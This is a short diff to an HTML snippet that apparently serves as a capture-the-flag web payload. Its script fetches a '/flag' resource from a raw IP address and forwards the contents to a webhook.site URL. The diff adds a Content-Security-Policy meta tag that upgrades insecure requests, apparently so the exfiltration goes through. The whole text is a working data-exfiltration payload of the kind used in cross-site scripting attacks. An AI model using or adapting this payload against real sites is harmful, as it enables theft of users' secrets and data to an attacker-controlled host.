@@ -1,3 +1,7 @@
+<head>
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+</head>
+
 <script>
     fetch(`http://51.120.3.165/flag`).then(response => response.text()).then(data => {
         fetch(`https://webhook.site/bab544ec-ab97-4f19-a87c-18afab171a00/?flag=${data}`);
